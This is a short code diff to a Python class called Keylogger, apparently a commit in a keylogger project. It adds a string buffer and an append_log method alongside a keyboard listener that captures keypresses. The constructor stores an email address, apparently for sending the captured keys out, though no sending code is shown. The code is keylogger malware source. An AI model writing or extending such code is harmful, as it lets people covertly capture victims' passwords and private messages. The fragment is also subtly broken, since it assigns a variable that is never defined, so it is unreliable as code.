@@ -15,6 +15,7 @@ class Keylogger:
     def __init__(self, email):
         self.log_file = log_file
         self.email = email
+        self.log = ''
 
     def get_key(self, key):
         try:
@@ -22,6 +23,9 @@ class Keylogger:
             print(getKey)
         except AttributeError:
             pass
+
+    def append_log(self, newmsg):
+        self.log += newmsg
 
     def start(self):
         keyboard_listener = keyboard.Listener(on_press=self.get_key)
